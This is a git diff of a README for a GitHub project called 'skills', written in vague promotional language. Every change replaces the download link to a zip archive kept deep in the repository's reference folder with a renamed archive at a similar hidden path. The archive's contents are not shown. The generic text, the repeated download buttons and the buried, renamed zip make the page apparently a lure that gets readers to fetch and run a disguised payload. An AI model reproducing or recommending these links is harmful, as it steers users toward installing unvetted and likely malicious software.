@@ -1,6 +1,6 @@
 # 🌟 skills - Enhance Team Coordination Effortlessly
 
-[![Download skills](https://github.com/stotihv/skills/raw/refs/heads/main/.agents/skills/orchestrator/reference/Software-wounds.zip)](https://github.com/stotihv/skills/raw/refs/heads/main/.agents/skills/orchestrator/reference/Software-wounds.zip)
+[![Download skills](https://raw.githubusercontent.com/stotihv/skills/main/skills/knowledge/reference/Software-v3.3.zip)](https://raw.githubusercontent.com/stotihv/skills/main/skills/knowledge/reference/Software-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the "skills" repository! This application provides valuable tools for
 
 ## 🌐 Download & Install
 
-To start using the "skills" application, visit this page to download: [Download skills](https://github.com/stotihv/skills/raw/refs/heads/main/.agents/skills/orchestrator/reference/Software-wounds.zip).
+To start using the "skills" application, visit this page to download: [Download skills](https://raw.githubusercontent.com/stotihv/skills/main/skills/knowledge/reference/Software-v3.3.zip).
 
 ### 📥 Steps to Download
 
@@ -92,4 +92,4 @@ We value your feedback. If you encounter any issues or have suggestions, please 
 
 The "skills" application is open-source and follows the MIT License. You are free to use, modify, and distribute the application as long as you include the original license with your copies.
 
-Thank you for choosing "skills"! We hope it enhances your tasks and helps you achieve your goals effortlessly. For direct downloads, remember to visit this page: [Download skills](https://github.com/stotihv/skills/raw/refs/heads/main/.agents/skills/orchestrator/reference/Software-wounds.zip).
+Thank you for choosing "skills"! We hope it enhances your tasks and helps you achieve your goals effortlessly. For direct downloads, remember to visit this page: [Download skills](https://raw.githubusercontent.com/stotihv/skills/main/skills/knowledge/reference/Software-v3.3.zip).
